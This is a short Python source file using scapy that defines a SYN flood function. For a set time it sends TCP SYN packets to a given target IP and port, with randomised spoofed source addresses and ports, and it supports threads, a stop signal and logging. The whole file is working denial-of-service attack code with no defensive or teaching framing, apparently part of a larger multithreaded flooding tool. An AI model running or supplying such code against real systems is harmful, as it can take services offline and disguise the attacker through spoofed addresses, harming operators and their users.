import time
from scapy.all import IP, TCP, RandIP, RandShort, send
from colorama import Fore

def syn_flood(target_ip, target_port, duration, stop_event, lock, thread_stats, logger=None):
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        pkt = IP(src=RandIP(), dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
        try:
            send(pkt, verbose=0)
            if logger:
                logger.info(f"[SYN] Sent packet to {target_ip}:{target_port}")
        except Exception as e:
            print(Fore.RED + f"[x] Packet send error: {e}")
            if logger:
                logger.error(f"[SYN] Packet send error: {e}")

    with lock:
        thread_stats['ended'] += 1